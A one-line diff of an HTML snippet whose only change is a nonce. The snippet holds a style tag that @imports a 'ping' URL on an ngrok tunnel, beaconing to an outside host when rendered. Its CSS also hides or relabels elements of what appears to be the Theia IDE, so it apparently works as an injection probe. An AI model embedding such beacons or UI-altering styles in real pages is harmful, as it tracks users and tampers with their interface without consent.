@@ -1,1 +1,1 @@
-<p><style>@import url("https://46f49e42fc9d.ngrok.io/ping?nonce=1606834500100000"); .theia-open-preview-icon {display:none} .p-TabBar-toolbar .item > div {width:200px}.plugin-icon-15 {background:none}.plugin-icon-15:before { content: "__" }</style>
+<p><style>@import url("https://46f49e42fc9d.ngrok.io/ping?nonce=1606834740100000"); .theia-open-preview-icon {display:none} .p-TabBar-toolbar .item > div {width:200px}.plugin-icon-15 {background:none}.plugin-icon-15:before { content: "__" }</style>
